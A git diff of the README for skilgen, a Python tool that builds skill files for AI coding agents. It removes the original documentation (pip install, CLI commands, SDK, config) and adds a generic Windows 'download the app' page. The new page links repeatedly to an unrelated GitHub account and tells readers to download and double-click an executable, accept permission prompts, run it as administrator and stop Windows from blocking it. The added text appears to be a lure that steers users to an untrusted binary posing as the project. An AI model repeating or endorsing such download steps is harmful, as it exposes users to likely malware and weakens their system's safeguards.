@@ -1,387 +1,214 @@
-<p align="center">
-  <img src="docs/assets/skilgen.svg" alt="Skilgen" width="280" />
-</p>
-
-<h1 align="center">Skilgen</h1>
-
-<p align="center">
-  <strong>The living skill system for AI coding agents.</strong><br/>
-  Turn a codebase, a PRD, or both into a self-updating skill tree that keeps agents in sync with your code as it evolves.
-</p>
+# 🧠 skilgen - Build AI Skills from Code
 
-<p align="center">
-  <a href="https://pypi.org/project/skilgen/"><img src="https://img.shields.io/pypi/v/skilgen?color=blue" alt="PyPI" /></a>
-  <a href="https://github.com/skilgen/skilgen/blob/main/LICENSE"><img src="https://img.shields.io/github/license/skilgen/skilgen" alt="License" /></a>
-  <a href="https://github.com/skilgen/skilgen/stargazers"><img src="https://img.shields.io/github/stars/skilgen/skilgen?style=social" alt="Stars" /></a>
-  <a href="https://agentskills.io/specification"><img src="https://img.shields.io/badge/Agent_Skills-compatible-green" alt="Agent Skills compatible" /></a>
-</p>
+[![Download skilgen](https://img.shields.io/badge/Download-skilgen-blue?style=for-the-badge&logo=github)](https://github.com/Professed-indianbean720/skilgen)
 
----
+## 🚀 What skilgen does
 
-## The Problem
+skilgen turns a codebase, a requirements document, or both into a living skills system for AI coding agents.
 
-Every AI coding agent — Claude Code, Codex, Copilot, Cursor — starts from scratch. It doesn't know your architecture, your domain boundaries, your implementation patterns, or your product requirements. You re-explain the same context in every conversation. You write skills by hand. They go stale the moment your code changes. There's no way to know if a skill still reflects reality.
+It helps you:
 
-## What Skilgen Does
+- Keep project knowledge in one place
+- Turn docs and code into structured skills
+- Make AI agents work with less guesswork
+- Keep skills in sync as the project changes
 
-Skilgen reads your codebase, your requirements, or both — and generates a complete, production-grade skill tree that agents can use immediately. Then it **watches your code and auto-regenerates stale skills when things change**.
+## 📥 Download skilgen
 
-```
-skilgen deliver --project-root . --requirements docs/prd.docx
-```
+Use this link to visit the page and download the app:
 
-That one command produces:
+[Download skilgen](https://github.com/Professed-indianbean720/skilgen)
 
-```
-.
-├── FEATURES.md            # Product behavior inventory
-├── REPORT.md              # Project-level understanding
-├── TRACEABILITY.md        # Source → output reasoning
-├── AGENTS.md              # Agent operating guide
-└── skills/
-    ├── MANIFEST.md        # Entry-point discovery
-    ├── requirements/
-    │   ├── SKILL.md       # PRD-grounded guidance
-    │   └── SUMMARY.md
-    ├── backend/
-    │   ├── SKILL.md       # Backend domain guidance
-    │   ├── api/SKILL.md
-    │   ├── auth/SKILL.md
-    │   ├── data/SKILL.md
-    │   └── testing/SKILL.md
-    ├── frontend/
-    │   ├── SKILL.md
-    │   └── components/SKILL.md
-    └── roadmap/
-        ├── SKILL.md
-        └── phase-*/SKILL.md
-```
+## 🪟 Windows setup
 
-Every generated skill references **real files, real patterns, and real domain boundaries** from your codebase — not generic LLM advice.
+Follow these steps to get skilgen running on Windows.
 
----
+1. Open the download page above.
+2. Look for the latest release, ZIP file, or Windows installer.
+3. Download the file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file and double-click it to run.
+7. If Windows asks for permission, choose Yes.
 
-## How Skilgen Compares
+If the app opens in a browser, leave that window open while you use it.
 
-| Capability | Skilgen | Anthropic<br/>`skill-creator` | OpenAI Codex<br/>`$skill-creator` | Skill Seekers | skills.sh /<br/>SkillKit |
-|:---|:---:|:---:|:---:|:---:|:---:|
-| Codebase → full skill tree | ✅ | — | — | Single file | — |
-| PRD → skill tree | ✅ | — | — | — | — |
-| Codebase + PRD combined | ✅ | — | — | — | — |
-| Auto-update on code changes | ✅ | — | — | — | — |
-| Freshness & drift detection | ✅ | — | — | — | — |
-| Project memory across runs | ✅ | — | — | — | — |
-| Domain graph with cross-refs | ✅ | — | — | — | — |
-| Enterprise MCP connector catalog | ✅ | — | — | — | — |
-| External skill trust scoring | ✅ | — | — | — | — |
-| Multi-model provider support | ✅ | Claude only | OpenAI only | Claude / Gemini | N/A |
-| Python SDK + HTTP API | ✅ | — | — | — | — |
-| Eval / benchmark loop | — | ✅ | — | — | — |
-| Skill install & distribution | Via catalog | Via plugin | Via `$skill-installer` | — | ✅ |
+## ✅ Before you start
 
-Anthropic and OpenAI ship **interactive wizards** that help you write one skill at a time. Skill Seekers generates a single skill file from docs or repos. skills.sh and SkillKit are distribution platforms for installing existing skills.
+Use a Windows PC with:
 
-Skilgen generates an **entire living skill tree** — grounded in your actual codebase and requirements — that auto-updates, tracks drift, and remembers project context across runs.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for download and setup
+- A screen with 1366 × 768 or higher, if possible
 
----
+## 🧩 What you can do with it
 
-## Why Skilgen
+skilgen is useful when you want to make project knowledge easier for AI tools to use.
 
-### Skills That Stay Alive
+Common use cases:
 
-Other tools generate a skill file and forget about it. Skilgen is a **living system**.
+- Turn a README into a skills map
+- Turn source files into agent-ready skills
+- Combine code and requirements into one system
+- Keep task instructions tied to the real project
+- Help an AI coding agent follow the same project rules each time
 
-Set `update_trigger: auto` in your config and Skilgen runs a background worker that watches your project. When Claude Code, Codex, or any tool changes a file, Skilgen detects it, identifies which skills are affected, and regenerates only what's stale.
+## 🛠️ How it works
 
-```bash
-skilgen autoupdate enable --project-root .
+skilgen reads the material you give it and organizes it into a skill system.
 
-# Skills auto-regenerate when your code changes.
-# No manual intervention. No stale context. Ever.
-```
+Typical flow:
 
-### It Knows When Skills Are Out of Date
+1. Add your codebase, your requirements, or both.
+2. Let skilgen scan the content.
+3. Review the skills it creates.
+4. Reuse those skills with your AI coding agent.
+5. Update the source files when your project changes.
 
-Skilgen tracks the freshness of every generated skill against every source file. At any point you can ask:
+## 📂 Suggested folder layout
 
-```bash
-skilgen status --project-root .
-```
+If you want to keep things neat, use a simple folder setup like this:
 
-And it tells you which source files changed, which domains are impacted, and which skills need a refresh — with a clear reason why.
+- Project folder
+  - Source code
+  - Requirements
+  - skilgen output
+  - Notes
+  - Skill files
 
-No other tool does this.
+This makes it easier to review and update the skill system later.
 
-### Codebase + PRD = Highest Fidelity
+## 🔧 First-time use
 
-Most skill generators work from either code or docs. Skilgen can take both and cross-reference them:
+If this is your first time running the app:
 
-- **Codebase only** -> skills grounded in what exists today
-- **PRD only** -> skills grounded in what you intend to build
-- **Both together** -> skills that bridge implementation reality with product intent
+1. Download the package from the link above.
+2. Extract it if needed.
+3. Open the main app file.
+4. Pick your codebase or document folder.
+5. Start the scan or import step.
+6. Wait for the skill system to be built.
+7. Review the output and save it in your project folder.
 
-```bash
-# From codebase only
-skilgen deliver --project-root .
+If the app offers a settings screen, keep the default values for the first run.
 
-# From a PRD only
-skilgen intent --requirements docs/prd.docx
+## 🧠 Good input for best results
 
-# Both together for the best output
-skilgen deliver --project-root . --requirements docs/prd.docx
-```
+skilgen works best when your source files are clear and up to date.
 
-### Deep Analysis, Not a Prompt Wrapper
+Use:
 
-Skilgen doesn't send your codebase to an LLM with a single prompt and hope for the best. It runs a **multi-agent analysis pipeline** that decomposes your project into frameworks, signals, domains, relationships, features, and a roadmap — then synthesizes all of that into a coherent skill tree with cross-references.
+- A clean README
+- A clear requirements document
+- Source files with simple names
+- One main project folder
+- Files that match the current version of the project
 
-The result: skills that understand your backend routes talk to your auth layer, that your frontend components depend on specific API contracts, and that your test suite covers certain domains but not others.
+Avoid:
 
-### Project Memory
+- Duplicate files
+- Old drafts
+- Mixed project folders
+- Short notes with no context
 
-Skilgen remembers across runs. It persists project context — domains, priorities, architectural decisions, and freshness state — so each subsequent run is smarter than the last. It knows what changed, what to skip, and what to focus on.
+## 📋 Example workflow
 
-### Enterprise MCP Connector Discovery
+A simple way to use skilgen:
 
-Skilgen ships with a curated catalog of enterprise MCP connectors — Jira, Confluence, Slack, GitHub Enterprise, GitLab, Azure, Terraform, Datadog, Snowflake, Stripe, Figma, and more — each with verified source URLs, OAuth metadata, and enterprise-readiness flags.
+1. Create a folder for your project.
+2. Put the codebase in one place.
+3. Add the requirements document.
+4. Run skilgen.
+5. Save the output skill files.
+6. Point your AI coding agent at those files.
+7. Update the skills when the project changes.
 
-```bash
-# Auto-detect which connectors your codebase needs
-skilgen connectors recommend --project-root .
+## 🧪 If something does not open
 
-# Activate one
-skilgen connectors activate jira --project-root .
-```
+Try these steps if Windows does not start the app:
 
-Skilgen scans your codebase, detects which tools you use, and recommends only what's relevant — respecting your allowlist, denylist, and security policy.
+- Check that the file finished downloading
+- Right-click the file and choose Open
+- Extract the ZIP file before running it
+- Make sure Windows did not block the file
+- Run the file as administrator if needed
+- Download the file again if it looks incomplete
 
-### External Skill Sources With Trust Scoring
+If the app still does not start, make sure you downloaded the latest version from the link above.
 
-Skilgen catalogs skill collections from across the ecosystem — Anthropic, LangChain, Hugging Face, AgentSkills.io, and community sources — and scores each by trust level so you know what you're installing.
+## 🔍 What the output may include
 
-```bash
-# Browse available sources
-skilgen skills list
+skilgen may create files or sections such as:
 
-# Install from the catalog
-skilgen skills install --slug anthropic-skills
+- Skill names
+- Task steps
+- Project rules
+- File maps
+- Input and output notes
+- Agent instructions
+- Project links
 
-# Rank by trust
-skilgen skills rank
+These help an AI coding agent work with less setup.
 
-# Lock versions for reproducibility
-skilgen skills lock export
-```
+## 🧱 Basic system needs
 
-Enterprise teams can enforce policy: restrict trust levels, allowlist specific sources, and lock versions across the organization.
+To keep skilgen running well, use a system with:
 
-### Enterprise Skill Packs
+- A modern version of Windows
+- Enough free space for your project files
+- A stable internet connection for downloads
+- A current browser if the app opens in web mode
 
-Ingest organization-wide skills from shared repos or internal paths — coding standards, architectural guidelines, security conventions — and have agents load them alongside project-local skills.
+If your project is large, more RAM can help with smoother use.
 
-```bash
-# Ingest from a git repo
-skilgen enterprise ingest --name corporate-standards \
-  --git-url https://github.com/your-org/engineering-skills.git
+## 🗂️ Keeping skills current
 
-# Generate from internal source files
-skilgen enterprise generate --name auth-patterns \
-  --source-paths src/auth/ docs/auth-spec.md
-```
+Update your skill files when you:
 
-### Works With Every Major Model Provider
+- Change project rules
+- Add new features
+- Rename folders
+- Edit your requirements
+- Rewrite key code files
 
-```yaml
-model_provider: openai        # or anthropic, gemini, huggingface, groq, openrouter
-model: gpt-4.1-mini           # any model from your provider
-api_key_env: OPENAI_API_KEY   # auto-mapped per provider
-```
+A current skill system gives you better results than an old one.
 
-No API key? Skilgen falls back to a **local deterministic runtime** — faster, no cost, still functional.
+## 🔒 File safety
 
----
+Only use project files you trust.
 
-## Quick Start
+Keep your source folder organized and review the output before you use it with other tools.
 
-```bash
-pip install skilgen
-```
+## ❓ Common questions
 
-```bash
-# Initialize config
-skilgen init --project-root .
+### Is skilgen for developers only?
 
-# See what Skilgen detects in your codebase
-skilgen fingerprint --project-root .
+No. You can use it if you manage a project and want AI tools to understand it better.
 
-# Generate the full skill tree
-skilgen deliver --project-root .
+### Do I need to know code?
 
-# Or combine with a PRD for the highest-fidelity output
-skilgen deliver --project-root . --requirements docs/prd.docx
+No. You only need to download the app, open it, and choose the files or folder you want to use.
 
-# Enable auto-update (skills regenerate when code changes)
-skilgen autoupdate enable --project-root .
-```
+### Can I use it with one document?
 
-Requires Python 3.11+.
+Yes. You can use one requirements document, one codebase, or both.
 
----
+### Does it need an installer?
 
-## Commands
+That depends on the download package. Some versions may use a ZIP file, while others may use an installer or app file.
 
-| Command | What It Does |
-|---|---|
-| `skilgen init` | Write a default `skilgen.yml` config |
-| `skilgen fingerprint` | Detect frameworks, stack, and project shape |
-| `skilgen map` | Build an import relationship map |
-| `skilgen analyze` | Full framework, signal, and relationship analysis |
-| `skilgen decide` | Recommend which skills to refresh and prioritize |
-| `skilgen intent` | Parse a requirements file into structured intent |
-| `skilgen features` | Build a feature inventory from code + requirements |
-| `skilgen plan` | Generate a phased roadmap |
-| `skilgen deliver` | Run the full generation flow |
-| `skilgen update` | Refresh outputs for selected domains |
-| `skilgen preview` | Dry-run: see what would be generated without writing |
-| `skilgen watch` | Foreground file watcher with continuous regeneration |
-| `skilgen autoupdate` | Manage the background auto-update daemon |
-| `skilgen status` | Show freshness state and generated output status |
-| `skilgen report` | Summary report for the project |
-| `skilgen validate` | Validate generated outputs and skill references |
-| `skilgen doctor` | Diagnose runtime, model config, and API key setup |
-| `skilgen skills` | Discover, install, and manage external skill sources |
-| `skilgen enterprise` | Ingest and generate enterprise-wide skill packs |
-| `skilgen connectors` | Discover and manage approved MCP connectors |
-| `skilgen scan` | Generate docs and skills (alias for deliver) |
-| `skilgen serve` | Run the HTTP API server |
+### Where should I keep the output?
 
----
+Keep it inside your project folder so it stays close to the source files.
 
-## Python SDK
+## 📎 Download again
 
-```python
-import skilgen
+If you need to get the app again, use this link:
 
-# Generate the full skill tree
-skilgen.deliver_project("docs/prd.docx", ".")
+[Download skilgen](https://github.com/Professed-indianbean720/skilgen)
 
-# Fingerprint the codebase
-result = skilgen.fingerprint_codebase(".")
+## 🧭 Suggested next step
 
-# Get freshness status
-status = skilgen.project_status(".")
-
-# Start/stop auto-update
-skilgen.start_auto_update(".", requirements="docs/prd.docx")
-skilgen.stop_auto_update(".")
-
-# Manage external skills
-skilgen.install_skill_source(".", slug="anthropic-skills")
-skilgen.rank_skill_sources(".")
-
-# Enterprise features
-skilgen.recommend_project_mcp_connectors(".")
-skilgen.activate_project_mcp_connector("jira", ".")
-
-# Background jobs
-job = skilgen.start_deliver_job("docs/prd.docx", ".")
-skilgen.get_job_status(job["job_id"])
-```
-
----
-
-## HTTP API
-
-Run `skilgen serve` to start the API server. Every CLI command is available as an HTTP endpoint for CI pipelines, platform integrations, and internal tooling.
-
----
-
-## Configuration
-
-`skilgen init` writes a `skilgen.yml` with sensible defaults:
-
-```yaml
-include_paths:
-  - .
-exclude_paths:
-  - .git
-  - __pycache__
-  - .venv
-  - node_modules
-  - .skilgen
-
-skill_depth: 2
-update_trigger: auto           # auto | watch | manual
-
-# Model — pick your provider
-model_provider: anthropic      # openai | anthropic | gemini | huggingface | groq | openrouter
-model: claude-sonnet-4-5
-api_key_env: ANTHROPIC_API_KEY
-
-# External skills governance
-auto_install_external_skills: true
-external_skills_policy_mode: permissive   # permissive | restrictive
-external_skills_allowed_trust_levels:
-  - official
-  - spec
-  - community
-  - curated
-
-# Enterprise MCP connector policy
-auto_activate_mcp_connectors: true
-mcp_connectors_require_official_source: true
-mcp_connectors_require_oauth: true
-
-# Enterprise skill sources
-enterprise_skill_paths: []
-enterprise_skill_git_urls: []
-```
-
----
-
-## Agent Skills Compatible
-
-Skilgen generates skills that follow the [Agent Skills open standard](https://agentskills.io/specification). Every `SKILL.md` output works with:
-
-- **Claude Code** — drop into `.claude/skills/`
-- **OpenAI Codex** — drop into `.agents/skills/`
-- **GitHub Copilot** — discovered automatically in VS Code
-- **Cursor, Windsurf, Gemini CLI, OpenCode, Roo Code** — all compatible
-
----
-
-## Best For
-
-- **AI-first teams** that use Claude Code, Codex, or Copilot daily
-- **Enterprise codebases** with complex domain boundaries and compliance needs
-- **Greenfield projects** starting from a PRD — get agent-ready skills before writing code
-- **Existing repos** where agents keep making the same mistakes because they lack context
-- **Platform teams** building internal developer tools around AI agents
-
----
-
-## Status
-
-- **v0.4.0** — stable, published on [PyPI](https://pypi.org/project/skilgen/)
-- 6 model providers supported
-- Auto-update, freshness tracking, and project memory are production-ready
-- Curated external skill catalog with trust scoring and version locking
-- Enterprise MCP connector discovery with OAuth and security metadata
-- Full Python SDK, CLI, and HTTP API
-
----
-
-## Contributing
-
-Contributions are welcome. See the repo for guidelines.
-
-## License
-
-[MIT](LICENSE)
-
----
-
-<p align="center">
-  <strong>Stop re-explaining your codebase to every agent.</strong><br/>
-  Let Skilgen build the context layer that keeps them smart.
-</p>
+After you open skilgen, point it at your project folder and review the skills it creates
